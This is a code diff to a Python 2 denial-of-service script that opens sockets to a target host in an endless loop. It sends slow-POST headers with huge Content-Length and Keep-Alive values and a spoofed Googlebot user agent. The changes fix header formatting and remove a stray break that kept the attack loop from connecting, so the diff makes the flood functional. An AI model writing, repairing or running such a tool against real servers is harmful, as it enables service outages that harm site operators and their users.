@@ -37,34 +37,30 @@ def set_header(targett,user_agent,inputs):
             agents += ra.read().split('\n')
             ra.close()
 
-        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: {}\r\n%s=\r\n".format(inputs[0],targett,random.choice(agents),inputs[1])
+        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: {}\r\n{}=\r\n".format(inputs[0],targett,random.choice(agents),inputs[1])
         return header
     else:
-        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n%s=".format(inputs[0],targett,inputs[1])
+        header = "POST {} HTTP/1.1\r\nContent-Length: 100000000\r\nHost: {}\r\nKeep-Alive: 99999999\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n{}=".format(inputs[0],targett,inputs[1])
         return header
 
 def attack(targett,port,header):
     while True:
-            sock = socket.socket()
-            try:
-                if 'http://' in targett:
-                    targett = targett.replace('http://', '')
-                elif 'https://' in targett:
-                    targett = targett.replace('https://','')
-                else:
-                    pass
-                break
-                sock.connect((targett,port))
-                if sock:
-                    print 'connected\n'
-                    sock.send(header)
-                    print 'header sended\n'
-                    sock.recv(1024)
-                    sock.recv(1024)
-                else:
-                    raise Exception
-            except:
-                print 'Host recusou as conexoes\n'
+        sock = socket.socket()
+        try:
+            if 'http://' in targett:
+                targett = targett.replace('http://', '')
+            elif 'https://' in targett:
+                targett = targett.replace('https://','')
+            else:
+                pass
+            sock.connect((targett,port))
+            print 'connected\n'
+            sock.send(header)
+            print 'header sended\n'
+            sock.recv(1024)
+            sock.recv(1024)
+        except:
+            print 'Host recusou as conexoes\n'
 
 def arguments():
     global args
